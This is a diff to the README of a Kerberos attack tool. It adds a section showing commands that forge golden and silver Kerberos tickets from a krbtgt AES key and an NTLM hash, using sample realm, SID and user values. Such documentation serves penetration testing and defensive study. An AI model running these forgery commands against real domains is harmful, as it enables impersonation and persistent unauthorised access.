@@ -114,6 +114,18 @@ Convert krb to ccache:
 ```shell
 cerbero convert hades.krb hades.ccache
 ```
+### Craft
+To `craft` golden and silver tickets.
+
+Craft a golden ticket (by using the `krbtgt` AES256 key):
+```shell
+cerbero craft --realm under.world --realm-sid S-1-5-21-658410550-3858838999-180593761 --user kratos --aes-256 fed0c966ff7f88d776bb35fed0f039725f8bbb87017d5b6b76ee848f25562d2c
+```
+
+Craft a silver ticket (for the service `cifs` hosted by the machine `styx`):
+```shell
+cerbero craft --realm under.world --realm-sid S-1-5-21-658410550-3858838999-180593761 --user kratos --ntlm 29f9ab984728cc7d18c8497c9ee76c77 --spn cifs/styx,under.world
+```
 
 ### Kerberoast
 To format encrypted part of tickets in order to be cracked by hashcat or john.
